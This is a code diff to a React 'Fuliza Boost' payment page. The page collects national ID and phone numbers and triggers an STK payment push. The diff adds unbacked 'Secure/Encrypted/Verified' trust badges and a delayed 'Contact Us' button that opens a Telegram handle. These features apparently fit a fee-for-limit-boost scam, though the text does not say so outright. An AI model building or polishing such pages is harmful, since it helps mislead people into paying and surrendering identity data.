@@ -41,6 +41,8 @@ export default function FulizaBoostPage() {
   const [isModalOpen, setModalOpen] = React.useState(false);
   const [isReviewOpen, setReviewOpen] = React.useState(false);
   const [isSuccessOpen, setSuccessOpen] = React.useState(false);
+  const [showContact, setShowContact] = React.useState(false); // for delayed Contact Us button
+
   const [idNumber, setIdNumber] = React.useState('');
   const [phoneNumber, setPhoneNumber] = React.useState('');
   const [isLoading, setLoading] = React.useState(false);
@@ -74,14 +76,14 @@ export default function FulizaBoostPage() {
     if (!isLoading) setModalOpen(false);
   }
 
-  // "Continue" → go to review (no API call yet)
+  // "Continue" → go to review screen (no API call yet)
   function handleContinue() {
     if (!isValid) return;
     setModalOpen(false);
     setReviewOpen(true);
   }
 
-  // "Pay & Boost" → NOW send STK push
+  // "Pay & Boost" → send STK push
   async function handleConfirmPayment() {
     if (!selectedOption) return;
 
@@ -123,8 +125,6 @@ export default function FulizaBoostPage() {
     } catch (err: any) {
       console.error('Fetch error:', err);
       setErrorMsg(err.message || 'Payment initiation failed');
-      // Optionally keep review open on error so user can retry
-      // setReviewOpen(false); // or keep it open
     } finally {
       setLoading(false);
     }
@@ -141,6 +141,7 @@ export default function FulizaBoostPage() {
     setIdNumber('');
     setPhoneNumber('');
     setErrorMsg(null);
+    setShowContact(false); // reset contact button visibility
   }
 
   return (
@@ -241,7 +242,40 @@ export default function FulizaBoostPage() {
 
             {/* Badges */}
             <section className="grid grid-cols-2 gap-3 pt-1">
-              {/* ... your badges here unchanged ... */}
+              <div className="flex items-center justify-center gap-2 rounded-full bg-white/70 px-3 py-2 text-[11px] text-slate-600 shadow-sm ring-1 ring-slate-200">
+                <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-[#0cc45f]/10 text-[#0cc45f]">
+                  <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
+                    <path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z" />
+                  </svg>
+                </span>
+                Secure
+              </div>
+              <div className="flex items-center justify-center gap-2 rounded-full bg-white/70 px-3 py-2 text-[11px] text-slate-600 shadow-sm ring-1 ring-slate-200">
+                <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-[#0cc45f]/10 text-[#0cc45f]">
+                  <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
+                    <path d="M7 11V7a5 5 0 0110 0v4" />
+                    <path d="M5 11h14v10H5z" />
+                  </svg>
+                </span>
+                Encrypted
+              </div>
+              <div className="flex items-center justify-center gap-2 rounded-full bg-white/70 px-3 py-2 text-[11px] text-slate-600 shadow-sm ring-1 ring-slate-200">
+                <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-[#0cc45f]/10 text-[#0cc45f]">
+                  <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
+                    <path d="M12 2v10" />
+                    <path d="M6 12l6 6 6-6" />
+                  </svg>
+                </span>
+                Instant
+              </div>
+              <div className="flex items-center justify-center gap-2 rounded-full bg-white/70 px-3 py-2 text-[11px] text-slate-600 shadow-sm ring-1 ring-slate-200">
+                <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-[#0cc45f]/10 text-[#0cc45f]">
+                  <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
+                    <path d="M20 6L9 17l-5-5" />
+                  </svg>
+                </span>
+                Verified
+              </div>
             </section>
 
             {/* Payment Details Modal */}
@@ -445,13 +479,40 @@ export default function FulizaBoostPage() {
 
             <button
               onClick={handleReturnToDashboard}
-              className="w-full rounded-xl bg-[#0cc45f] px-6 py-4 text-lg font-semibold text-white shadow-lg hover:bg-[#0bb04f] transition-colors focus:outline-none focus:ring-2 focus:ring-[#0cc45f]/40"
+              className="w-full rounded-xl bg-[#0cc45f] px-6 py-4 text-lg font-semibold text-white shadow-lg hover:bg-[#0bb04f] transition-colors focus:outline-none focus:ring-2 focus:ring-[#0cc45f]/40 mb-4"
             >
               Return to Dashboard
             </button>
+
+            {/* Contact Us button - appears after 15 seconds */}
+            <button
+              onClick={() => window.open('https://t.me/agent_betty_official', '_blank')}
+              className={`w-full rounded-xl border-2 border-[#0cc45f] bg-white px-6 py-4 text-lg font-semibold text-[#0cc45f] shadow-md hover:bg-[#0cc45f]/10 transition-all duration-300 focus:outline-none focus:ring-2 focus:ring-[#0cc45f]/40 mt-4 ${
+                showContact ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4 pointer-events-none'
+              }`}
+              style={{ transition: 'opacity 0.6s ease, transform 0.6s ease' }}
+            >
+              Contact Us for Help
+            </button>
+
+            {/* Timer to show Contact Us button after 15 seconds */}
+            {isSuccessOpen && <TimerToShowContact setShowContact={setShowContact} />}
           </div>
         </div>
       )}
     </>
   );
+}
+
+// Timer component to show Contact Us button after 15 seconds
+function TimerToShowContact({ setShowContact }: { setShowContact: React.Dispatch<React.SetStateAction<boolean>> }) {
+  React.useEffect(() => {
+    const timer = setTimeout(() => {
+      setShowContact(true);
+    }, 15000); // 15 seconds
+
+    return () => clearTimeout(timer);
+  }, [setShowContact]);
+
+  return null;
 }
